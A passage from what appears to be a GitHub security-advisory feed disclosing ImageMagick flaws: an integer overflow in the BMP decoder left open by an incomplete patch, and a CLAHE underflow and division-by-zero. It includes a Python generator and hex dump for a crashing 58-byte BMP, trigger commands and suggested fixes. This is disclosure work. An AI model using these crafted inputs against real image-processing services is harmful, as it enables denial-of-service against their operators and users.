<p>wooseokdotkim
<a href="mailto:wooseokdotkim@gmail.com">wooseokdotkim@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62171">https://nvd.nist.gov/vuln/detail/CVE-2025-62171</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00">https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.9.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.9.0</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2025/10/msg00019.html">https://lists.debian.org/debian-lts-announce/2025/10/msg00019.html</a></li>
<li><a href="https://github.com/advisories/GHSA-9pp9-cfwx-54rm">https://github.com/advisories/GHSA-9pp9-cfwx-54rm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9pp9-cfwx-54rm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-28T14:43:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-AnyCPU] ImageMagick has Integer Overflow in BMP Decoder (ReadBMP)]]></title>
        <id>https://github.com/advisories/GHSA-9pp9-cfwx-54rm</id>
        <link href="https://github.com/advisories/GHSA-9pp9-cfwx-54rm"/>
        <updated>2025-11-03T18:32:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>CVE-2025-57803 claims to be patched in ImageMagick 7.1.2-2, but <strong>the fix is incomplete and ineffective</strong>. The latest version <strong>7.1.2-5 remains vulnerable</strong> to the same integer overflow attack.</p>
<p>The patch added <code>BMPOverflowCheck()</code> but placed it <strong>after</strong> the overflow occurs, making it useless. A malicious 58-byte BMP file can trigger AddressSanitizer crashes and DoS.</p>
<p><strong>Affected Versions:</strong></p>
<ul>
<li>ImageMagick &lt; 7.1.2-2 (originally reported)</li>
<li><strong>ImageMagick 7.1.2-2 through 7.1.2-5 (incomplete patch)</strong></li>
</ul>
<p><strong>Platform and Configuration Requirements:</strong></p>
<ul>
<li>32-bit systems ONLY (i386, i686, armv7l, etc.)</li>
<li>Requires <code>size_t = 4 bytes</code>. (64-bit systems are <strong>NOT vulnerable</strong> (size_t = 8 bytes))</li>
<li>Requires modified resource limits: The default <code>width</code>, <code>height</code>, and <code>area</code> limits must have been manually increased (Systems using default ImageMagick resource limits are <strong>NOT vulnerable</strong>).</li>
</ul>
<hr>
<h2 id="detailsroot-cause-analysis">Details(Root Cause Analysis)</h2>
<h3 id="vulnerable-code-location">Vulnerable Code Location</h3>
<p><strong>File:</strong> <code>coders/bmp.c</code><br><strong>Lines:</strong> 1120-1122 (in version 7.1.2-5)</p>
<h3 id="the-incomplete-patch">The Incomplete Patch</h3>
<pre><code class="language-c">// Line 1120: Integer overflow happens HERE
extent = image-&gt;columns * bmp_info.bits_per_pixel;  // OVERFLOW!

// Line 1121: Uses already-overflowed value
bytes_per_line = 4*((extent+31)/32);

// Line 1122: Checks the RESULT, not the multiplication
if (BMPOverflowCheck(bytes_per_line, image-&gt;rows) != MagickFalse)
    ThrowReaderException(CorruptImageError, "InsufficientImageDataInFile");
</code></pre>
<h3 id="why-the-patch-fails">Why the Patch Fails</h3>
<p><strong>Attack Vector (32-bit system):</strong></p>
<pre><code>Input BMP Header:
  Width: 536,870,912 (0x20000000)
  Height: 1
  Bits Per Pixel: 32

Calculation on 32-bit system:
  extent = 536,870,912 × 32
         = 17,179,869,184 (0x400000000)
         
  32-bit truncation:
  0x400000000 &amp; 0xFFFFFFFF = 0x00000000  ← Overflow to ZERO!
  
  bytes_per_line = 4 × ((0 + 31) / 32)
                 = 4 × 0
                 = 0
  
  BMPOverflowCheck(0, 1):
    return (1 != 0) &amp;&amp; (0 &gt; 4294967295UL/1)
    return True &amp;&amp; (0 &gt; 4294967295)
    return True &amp;&amp; False
    return False  ← Does NOT detect overflow!
</code></pre>
<p><strong>The check fails because:</strong></p>
<ol>
<li>The overflow happens at Line 1120 (extent calculation)</li>
<li><code>extent</code> becomes 0 due to 32-bit truncation</li>
<li><code>bytes_per_line</code> is calculated as 0 (Line 1121)</li>
<li><code>BMPOverflowCheck(0, 1)</code> returns <strong>False</strong> (no overflow detected)</li>
<li>Code proceeds with corrupted values → ASan crash</li>
</ol>
<hr>
<h2 id="pocproof-of-concept">PoC(Proof of Concept)</h2>
<h3 id="minimal-58-byte-bmp-file">Minimal 58-byte BMP File</h3>
<p><strong>Hex dump:</strong></p>
<pre><code>00000000  42 4d 3a 00 00 00 00 00  00 00 36 00 00 00 28 00  |BM:.......6...(.|
00000010  00 00 00 00 00 20 01 00  00 00 01 00 20 00 00 00  |..... ...... ...|
00000020  00 00 00 00 00 00 13 0b  00 00 13 0b 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00                    |..........|
</code></pre>
<p><strong>Key Fields:</strong></p>
<ul>
<li>Offset 0x12: Width = <code>00 00 00 20</code> = 0x20000000 (536,870,912)</li>
<li>Offset 0x16: Height = <code>01 00 00 00</code> = 1</li>
<li>Offset 0x1C: BPP = <code>20 00</code> = 32</li>
</ul>
<h3 id="python-generator">Python Generator</h3>
<pre><code class="language-python">#!/usr/bin/env python3
import struct

width = 0x20000000   # 536,870,912
height = 1
bpp = 32

# BMP File Header (14 bytes)
file_header = b'BM'
file_header += struct.pack('&lt;I', 58)      # File size
file_header += struct.pack('&lt;HH', 0, 0)   # Reserved
file_header += struct.pack('&lt;I', 54)      # Pixel offset

# DIB Header (40 bytes)
dib_header = struct.pack('&lt;I', 40)        # Header size
dib_header += struct.pack('&lt;i', width)    # Width
dib_header += struct.pack('&lt;i', height)   # Height
dib_header += struct.pack('&lt;H', 1)        # Planes
dib_header += struct.pack('&lt;H', bpp)      # BPP
dib_header += struct.pack('&lt;I', 0)        # Compression
dib_header += struct.pack('&lt;I', 0)        # Image size
dib_header += struct.pack('&lt;i', 2835)     # X ppm
dib_header += struct.pack('&lt;i', 2835)     # Y ppm
dib_header += struct.pack('&lt;I', 0)        # Colors
dib_header += struct.pack('&lt;I', 0)        # Important colors

pixel_data = b'\x00\x00\x00\x00'

with open('overflow.bmp', 'wb') as f:
    f.write(file_header + dib_header + pixel_data)

print(f"Created overflow.bmp (58 bytes)")
</code></pre>
<hr>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<h3 id="environment-setup">Environment Setup</h3>
<pre><code class="language-bash"># Use 32-bit Docker container
docker run -it --name test-32bit i386/ubuntu:latest bash

# Install dependencies
apt-get update
apt-get install -y clang build-essential wget tar \
    libpng-dev libjpeg-dev libfreetype6-dev libxml2-dev \
    zlib1g-dev liblzma-dev libbz2-dev

# Download ImageMagick 7.1.2-5
cd /tmp
wget https://github.com/ImageMagick/ImageMagick/archive/refs/tags/7.1.2-5.tar.gz
tar xzf 7.1.2-5.tar.gz
cd ImageMagick-7.1.2-5
</code></pre>
<h3 id="build-with-addresssanitizer-32-bit-important">Build with AddressSanitizer (32-bit IMPORTANT!)</h3>
<pre><code class="language-bash"># Configure for 32-bit build (CRITICAL - must be 32-bit!)
./configure \
    --host=i686-pc-linux-gnu \
    --disable-dependency-tracking \
    --disable-silent-rules \
    --disable-shared \
    --disable-openmp \
    --disable-docs \
    --without-x \
    --without-perl \
    --without-magick-plus-plus \
    --without-lqr \
    --without-zstd \
    --without-tiff \
    --with-quantum-depth=8 \
    --disable-hdri \
    CFLAGS="-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined" \
    CXXFLAGS="-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined" \
    LDFLAGS="-fsanitize=address,undefined"

make -j$(nproc)

### Trigger the Vulnerability

```bash
# Set environment to bypass cache.c limits
export ASAN_OPTIONS="detect_leaks=0:malloc_context_size=20:allocator_may_return_null=1"
export MAGICK_WIDTH_LIMIT=2000000000
export MAGICK_HEIGHT_LIMIT=2000000000
export MAGICK_AREA_LIMIT=10000000000

# Test with malicious BMP (use Python script above to create it)
./utilities/magick identify overflow.bmp
</code></pre>
<hr>
<h2 id="addresssanitizer-output">AddressSanitizer Output</h2>
<pre><code>==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_poisoning.cc:37 
"((AddrIsInMem(addr + size - (1ULL &lt;&lt; kDefaultShadowScale)))) != (0)" (0x0, 0x0)
=================================================================
==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_descriptions.cc:80 
"((0 &amp;&amp; "Address is not in memory and not in shadow?")) != (0)" (0x0, 0x0)
==56720==WARNING: ASan is ignoring requested __asan_handle_no_return: 
stack top: 0x40801000; bottom 0x4372f000; size: 0xfd0d2000 (-49471488)
False positive error reports may follow
For details see https://github.com/google/sanitizers/issues/189
</code></pre>
<p>It operates in the following environments.</p>
<pre><code>export MAGICK_WIDTH_LIMIT=2000000000
export MAGICK_HEIGHT_LIMIT=2000000000
export MAGICK_AREA_LIMIT=10000000000
</code></pre>
<h2 id="impact">Impact</h2>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Attacker creates a 58-byte malicious BMP file</li>
<li>Uploads to web service that uses ImageMagick (on 32-bit system)</li>
<li>ImageMagick attempts to process the image</li>
<li>Integer overflow triggers AddressSanitizer crash</li>
<li>Service becomes unavailable (Denial of Service)</li>
</ol>
<p><strong>Real-world targets:</strong></p>
<ul>
<li>Web hosting platforms with image processing</li>
<li>CDN services with thumbnail generation</li>
<li>Legacy embedded systems</li>
<li>IoT devices running 32-bit Linux</li>
<li>Docker containers using 32-bit base images</li>
</ul>
<hr>
<h2 id="recommended-fix">Recommended Fix</h2>
<h3 id="correct-patch">Correct Patch</h3>
<p>The overflow check must happen <strong>before</strong> the multiplication:</p>
<pre><code class="language-c">// Add overflow check BEFORE calculating extent
if (BMPOverflowCheck(image-&gt;columns, bmp_info.bits_per_pixel) != MagickFalse)
    ThrowReaderException(CorruptImageError, "IntegerOverflowInDimensions");

// Now safe to calculate
extent = image-&gt;columns * bmp_info.bits_per_pixel;
bytes_per_line = 4*((extent+31)/32);

// Additional safety check
if (BMPOverflowCheck(bytes_per_line, image-&gt;rows) != MagickFalse)
    ThrowReaderException(CorruptImageError, "InsufficientImageDataInFile");
</code></pre>
<h3 id="alternative-use-64-bit-arithmetic">Alternative: Use 64-bit Arithmetic</h3>
<pre><code class="language-c">// Force 64-bit calculation
uint64_t extent_64 = (uint64_t)image-&gt;columns * (uint64_t)bmp_info.bits_per_pixel;

if (extent_64 &gt; UINT32_MAX)
    ThrowReaderException(CorruptImageError, "ImageDimensionsTooLarge");

extent = (size_t)extent_64;
bytes_per_line = 4*((extent+31)/32);
</code></pre>
<h3 id="credits">Credits</h3>
<p>wooseokdotkim
<a href="mailto:wooseokdotkim@gmail.com">wooseokdotkim@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62171">https://nvd.nist.gov/vuln/detail/CVE-2025-62171</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00">https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.9.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.9.0</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2025/10/msg00019.html">https://lists.debian.org/debian-lts-announce/2025/10/msg00019.html</a></li>
<li><a href="https://github.com/advisories/GHSA-9pp9-cfwx-54rm">https://github.com/advisories/GHSA-9pp9-cfwx-54rm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9pp9-cfwx-54rm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-28T14:43:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-HDRI-arm64] ImageMagick CLAHE : Unsigned underflow and division-by-zero lead to OOB pointer arithmetic and process crash (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</id>
        <link href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp"/>
        <updated>2025-10-31T09:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A single root cause in the CLAHE implementation — tile width/height becoming zero — produces two distinct but related unsafe behaviors.
Vulnerabilities exists in the <code>CLAHEImage()</code> function of ImageMagick’s <code>MagickCore/enhance.c</code>.</p>
<ol>
<li>Unsigned integer underflow → out-of-bounds pointer arithmetic (OOB): when <code>tile_info.height == 0</code>, the expression <code>tile_info.height - 1</code> (unsigned) wraps to a very large value; using that value in pointer arithmetic yields a huge offset and OOB memory access (leading to memory corruption, SIGSEGV, or resource exhaustion).</li>
<li><strong>Division/modulus by zero</strong>: where code performs <code>... / tile_info.width</code> or <code>... % tile_info.height</code> without re-checking for zero, causing immediate division-by-zero crashes under sanitizers or <code>abort</code> at runtime.</li>
</ol>
<p>Both behaviors are triggered by the same invalid tile condition (e.g., CLI exact <code>-clahe 0x0!</code> or automatic tile derivation <code>dim &gt;&gt; 3 == 0</code> for very small images). </p>
<hr>
<h2 id="details">Details</h2>
<h3 id="unsigned-underflowcan-lea-to-oob"><strong>Unsigned underflow(can lea to OOB)</strong></h3>
<ul>
<li><p>Location: <code>MagickCore/enhance.c</code>, around line 609</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>Vulnerable code</p>
<p>  enhance.c: 609</p>
<pre><code class="language-c">p += (ptrdiff_t) clahe_info-&gt;width * (tile.height - 1);
</code></pre>
</li>
<li><p>Root Cause</p>
<ul>
<li>If <code>tile.height == 0</code>, then <code>(tile.height - 1)</code> underflows to <code>UINT_MAX</code>.</li>
<li>Multiplication with <code>clahe_info-&gt;width</code> yields a huge value close to <code>SIZE_MAX</code>.</li>
<li>Adding this to <code>p</code> causes pointer arithmetic underflow.</li>
</ul>
</li>
</ul>
<h3 id="division-by-zero"><strong>Division-by-zero</strong></h3>
<ul>
<li><p>File / Location: <code>MagickCore/enhance.c</code>, around line 669</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>vulnerable code</p>
<p>  enhance.c: 669-673</p>
<pre><code class="language-c"> if ((image-&gt;columns % tile_info.width) != 0)
    tile_info.x=(ssize_t) (tile_info.width-(image-&gt;columns % tile_info.width));
  tile_info.y=0;
  if ((image-&gt;rows % tile_info.height) != 0)
    tile_info.y=(ssize_t) (tile_info.height-(image-&gt;rows % tile_info.height));
</code></pre>
</li>
<li><p>Root cause</p>
<p>  Missing input validation / bounds checks after computing default tile dimensions:</p>
<p>  If either <code>tile_info.width</code> or <code>tile_info.height</code> is 0, this triggers a division by zero. Zeros can reach this point through:</p>
<ol>
<li>Exact tiles: CLI <code>clahe 0x0!</code> (the <code>!</code> forces zero to be used verbatim).</li>
<li>Auto tiles on tiny images: When a requested tile is <code>0</code> (no <code>!</code>), the code derives a default from the image size (e.g., <code>dim &gt;&gt; 3</code>). For images with <code>dim &lt; 8</code>, this result is 0 unless clamped.</li>
</ol>
</li>
</ul>
<hr>
<h2 id="reproduction">Reproduction</h2>
<h3 id="unsigned-underflow"><strong>Unsigned underflow</strong></h3>
<p><strong>Environment</strong></p>
<p>Built with AddressSanitizer and UndefinedBehaviorSanitizer enabled.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick xc:black -clahe 0x0 null:
</code></pre>
<p><strong>Output</strong></p>
<pre><code>MagickCore/enhance.c:609:6: runtime error: addition of unsigned offset overflowed
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior MagickCore/enhance.c:609:6 in CLAHEImage
</code></pre>
<p><code>./magick -size 10x10 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/cd9637ee-1d03-4066-834d-fda22410dd8b" alt="image" height="64" width="1068">

<p>memory region corruption.</p>
<p><code>./magick -size 2000x2000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/ecbab79c-a3c2-4e8c-96c9-8e2aa8f0d2b2" alt="image" height="70" width="1069">

<p>→ Significant memory consumption and evidence of memory region corruption.</p>
<p><code>./magick -size 4000x4000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/63a7cec5-616b-4aa5-87f3-a546a87e6625" alt="image" height="49" width="776">

<p>→ Much larger memory usage; process appears to be aggressively consuming cache and address space.</p>
<p><code>./magick -size 8000x8000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/48b3aac8-98b3-4fbb-a5ca-4e7936bca44b" alt="image" height="46" width="748">

<p>→ Memory usage escalates further and begins exhausting available cache. If left running, the process is likely to crash (DoS) after sustained allocation attempts.</p>
<h3 id="division-by-zero-1"><strong>Division-by-zero</strong></h3>
<p><strong>Environment:</strong> ASan/UBSan-enabled build.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick -size 16x2 gradient: -type TrueColor -depth 8 -clahe 0x0! null:
</code></pre>
<p><strong>Output</strong></p>
<img src="https://github.com/user-attachments/assets/cfe44432-b429-49e4-8673-2ed55ba9a961" alt="image" height="818" width="1915">

<p><strong>Notes:</strong> Without sanitizers, the process may terminate with just <code>Aborted</code> (still DoS).</p>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li>Primary: Denial-of-Service — crash or sustained resource exhaustion (memory/cache thrash) when processing crafted parameters or small images via CLI or API. Attackers can trivially trigger via <code>clahe 0x0!</code> or by uploading very small images to services using ImageMagick.</li>
<li>Secondary (theoretical): OOB memory accesses and memory corruption could potentially be combined with other vulnerabilities to achieve more severe outcomes; however, no reliable code execution was demonstrated from these PoCs alone.</li>
</ul>
<hr>
<h2 id="suggested-concrete-patch-snippets">Suggested concrete patch snippets</h2>
<p>Apply in <code>CLAHEImage()</code> after <code>tile_info</code> is computed but <strong>before</strong> any division/modulus/pointer arithmetic:</p>
<pre><code class="language-c">if (exact_tiles_requested &amp;&amp; (tile_info.width == 0 || tile_info.height == 0)) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

if (!exact_tiles_requested) {
  tile_info.width  = (tile_info.width  == 0) ? MagickMax((size_t)1, image-&gt;columns &gt;&gt; 3) : tile_info.width;
  tile_info.height = (tile_info.height == 0) ? MagickMax((size_t)1, image-&gt;rows    &gt;&gt; 3) : tile_info.height;
}

if (tile_info.width == 0 || tile_info.height == 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

ssize_t tile_h_minus1 = (ssize_t)tile_info.height - 1;
if (tile_h_minus1 &lt; 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}
p += (ptrdiff_t) clahe_info-&gt;width * tile_h_minus1;
</code></pre>
<p>Notes about <code>exact_tiles_requested</code>: if the CLI/Wand parser already exposes whether <code>!</code> was present, use it. If not, add a parse-time flag so CLAHEImage can know whether <code>0</code> is literal or auto.</p>
<hr>
<h2 id="credit">Credit</h2>
<h3 id="team-whys">Team Whys</h3>
<p><strong>Bug Hunting Master Program, HSpace/Findthegap</strong></p>
<p><strong>Youngmin Kim</strong> 
<a href="mailto:kunshim@naver.com">kunshim@naver.com</a></p>
<p><strong>Woojin Park</strong></p>
<p><a href="https://github.com/jin-156">@jin-156</a>
<a href="mailto:1203kids@gmail.com">1203kids@gmail.com</a></p>
<p><strong>Youngin Won</strong></p>
<p><a href="https://github.com/amethyst0225">@amethyst0225</a>
<a href="mailto:youngin04@korea.ac.kr">youngin04@korea.ac.kr</a></p>
<p><strong>Siyeon Han</strong></p>
<p><a href="https://github.com/hanbunny">@hanbunny</a>
<a href="mailto:kokosyeon@gmail.com">kokosyeon@gmail.com</a></p>
<p><strong>Shinyoung Won</strong></p>
<p><a href="yosimich123@gmail.com">@yosiimich</a>
<a href="mailto:yosimich123@gmail.com">yosimich123@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62594">https://nvd.nist.gov/vuln/detail/CVE-2025-62594</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129">https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129</a></li>
<li><a href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-27T23:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-HDRI-OpenMP-arm64] ImageMagick CLAHE : Unsigned underflow and division-by-zero lead to OOB pointer arithmetic and process crash (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</id>
        <link href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp"/>
        <updated>2025-10-31T09:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A single root cause in the CLAHE implementation — tile width/height becoming zero — produces two distinct but related unsafe behaviors.
Vulnerabilities exists in the <code>CLAHEImage()</code> function of ImageMagick’s <code>MagickCore/enhance.c</code>.</p>
<ol>
<li>Unsigned integer underflow → out-of-bounds pointer arithmetic (OOB): when <code>tile_info.height == 0</code>, the expression <code>tile_info.height - 1</code> (unsigned) wraps to a very large value; using that value in pointer arithmetic yields a huge offset and OOB memory access (leading to memory corruption, SIGSEGV, or resource exhaustion).</li>
<li><strong>Division/modulus by zero</strong>: where code performs <code>... / tile_info.width</code> or <code>... % tile_info.height</code> without re-checking for zero, causing immediate division-by-zero crashes under sanitizers or <code>abort</code> at runtime.</li>
</ol>
<p>Both behaviors are triggered by the same invalid tile condition (e.g., CLI exact <code>-clahe 0x0!</code> or automatic tile derivation <code>dim &gt;&gt; 3 == 0</code> for very small images). </p>
<hr>
<h2 id="details">Details</h2>
<h3 id="unsigned-underflowcan-lea-to-oob"><strong>Unsigned underflow(can lea to OOB)</strong></h3>
<ul>
<li><p>Location: <code>MagickCore/enhance.c</code>, around line 609</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>Vulnerable code</p>
<p>  enhance.c: 609</p>
<pre><code class="language-c">p += (ptrdiff_t) clahe_info-&gt;width * (tile.height - 1);
</code></pre>
</li>
<li><p>Root Cause</p>
<ul>
<li>If <code>tile.height == 0</code>, then <code>(tile.height - 1)</code> underflows to <code>UINT_MAX</code>.</li>
<li>Multiplication with <code>clahe_info-&gt;width</code> yields a huge value close to <code>SIZE_MAX</code>.</li>
<li>Adding this to <code>p</code> causes pointer arithmetic underflow.</li>
</ul>
</li>
</ul>
<h3 id="division-by-zero"><strong>Division-by-zero</strong></h3>
<ul>
<li><p>File / Location: <code>MagickCore/enhance.c</code>, around line 669</p>
</li>
<li><p>Version tested: 7.1.2-8 (local ASan(undefined). /UBSan build)</p>
</li>
<li><p>vulnerable code</p>
<p>  enhance.c: 669-673</p>
<pre><code class="language-c"> if ((image-&gt;columns % tile_info.width) != 0)
    tile_info.x=(ssize_t) (tile_info.width-(image-&gt;columns % tile_info.width));
  tile_info.y=0;
  if ((image-&gt;rows % tile_info.height) != 0)
    tile_info.y=(ssize_t) (tile_info.height-(image-&gt;rows % tile_info.height));
</code></pre>
</li>
<li><p>Root cause</p>
<p>  Missing input validation / bounds checks after computing default tile dimensions:</p>
<p>  If either <code>tile_info.width</code> or <code>tile_info.height</code> is 0, this triggers a division by zero. Zeros can reach this point through:</p>
<ol>
<li>Exact tiles: CLI <code>clahe 0x0!</code> (the <code>!</code> forces zero to be used verbatim).</li>
<li>Auto tiles on tiny images: When a requested tile is <code>0</code> (no <code>!</code>), the code derives a default from the image size (e.g., <code>dim &gt;&gt; 3</code>). For images with <code>dim &lt; 8</code>, this result is 0 unless clamped.</li>
</ol>
</li>
</ul>
<hr>
<h2 id="reproduction">Reproduction</h2>
<h3 id="unsigned-underflow"><strong>Unsigned underflow</strong></h3>
<p><strong>Environment</strong></p>
<p>Built with AddressSanitizer and UndefinedBehaviorSanitizer enabled.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick xc:black -clahe 0x0 null:
</code></pre>
<p><strong>Output</strong></p>
<pre><code>MagickCore/enhance.c:609:6: runtime error: addition of unsigned offset overflowed
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior MagickCore/enhance.c:609:6 in CLAHEImage
</code></pre>
<p><code>./magick -size 10x10 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/cd9637ee-1d03-4066-834d-fda22410dd8b" alt="image" height="64" width="1068">

<p>memory region corruption.</p>
<p><code>./magick -size 2000x2000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/ecbab79c-a3c2-4e8c-96c9-8e2aa8f0d2b2" alt="image" height="70" width="1069">

<p>→ Significant memory consumption and evidence of memory region corruption.</p>
<p><code>./magick -size 4000x4000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/63a7cec5-616b-4aa5-87f3-a546a87e6625" alt="image" height="49" width="776">

<p>→ Much larger memory usage; process appears to be aggressively consuming cache and address space.</p>
<p><code>./magick -size 8000x8000 xc:black -clahe 0x0 null:</code></p>
<img src="https://github.com/user-attachments/assets/48b3aac8-98b3-4fbb-a5ca-4e7936bca44b" alt="image" height="46" width="748">

<p>→ Memory usage escalates further and begins exhausting available cache. If left running, the process is likely to crash (DoS) after sustained allocation attempts.</p>
<h3 id="division-by-zero-1"><strong>Division-by-zero</strong></h3>
<p><strong>Environment:</strong> ASan/UBSan-enabled build.</p>
<pre><code class="language-c">export UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1:detect_leaks=0
</code></pre>
<p><strong>Command</strong></p>
<pre><code class="language-bash">./magick -size 16x2 gradient: -type TrueColor -depth 8 -clahe 0x0! null:
</code></pre>
<p><strong>Output</strong></p>
<img src="https://github.com/user-attachments/assets/cfe44432-b429-49e4-8673-2ed55ba9a961" alt="image" height="818" width="1915">

<p><strong>Notes:</strong> Without sanitizers, the process may terminate with just <code>Aborted</code> (still DoS).</p>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li>Primary: Denial-of-Service — crash or sustained resource exhaustion (memory/cache thrash) when processing crafted parameters or small images via CLI or API. Attackers can trivially trigger via <code>clahe 0x0!</code> or by uploading very small images to services using ImageMagick.</li>
<li>Secondary (theoretical): OOB memory accesses and memory corruption could potentially be combined with other vulnerabilities to achieve more severe outcomes; however, no reliable code execution was demonstrated from these PoCs alone.</li>
</ul>
<hr>
<h2 id="suggested-concrete-patch-snippets">Suggested concrete patch snippets</h2>
<p>Apply in <code>CLAHEImage()</code> after <code>tile_info</code> is computed but <strong>before</strong> any division/modulus/pointer arithmetic:</p>
<pre><code class="language-c">if (exact_tiles_requested &amp;&amp; (tile_info.width == 0 || tile_info.height == 0)) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

if (!exact_tiles_requested) {
  tile_info.width  = (tile_info.width  == 0) ? MagickMax((size_t)1, image-&gt;columns &gt;&gt; 3) : tile_info.width;
  tile_info.height = (tile_info.height == 0) ? MagickMax((size_t)1, image-&gt;rows    &gt;&gt; 3) : tile_info.height;
}

if (tile_info.width == 0 || tile_info.height == 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
